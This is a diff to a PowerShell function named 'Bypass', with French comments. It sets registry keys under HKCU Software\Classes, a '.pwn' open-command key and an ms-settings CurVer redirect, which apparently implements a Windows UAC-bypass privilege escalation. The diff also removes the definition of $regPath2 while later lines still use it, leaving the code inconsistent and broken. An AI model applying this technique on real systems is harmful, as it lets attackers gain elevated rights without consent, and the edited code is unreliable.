@@ -272,7 +272,7 @@ function Bypass {
 
         # Create registry keys and set values
         $regPath1 = "HKCU:\Software\Classes\.pwn\Shell\Open\command"
-        $regPath2 = "HKCU:\Software\Classes\ms-settings\CurVer"
+
 
         # Supprime les clés existantes avant de créer de nouvelles pour éviter les conflits.
         Remove-Item -Path $regPath1 -Recurse -Force -ErrorAction SilentlyContinue
@@ -284,8 +284,6 @@ function Bypass {
 
         New-Item -Path $regPath2 -Force | Out-Null
         Set-ItemProperty -Path $regPath2 -Name "(default)" -Value ".pwn" -Force
-
-
 
         # Attends un court instant pour permettre l'exécution.
         Start-Sleep -Seconds 3
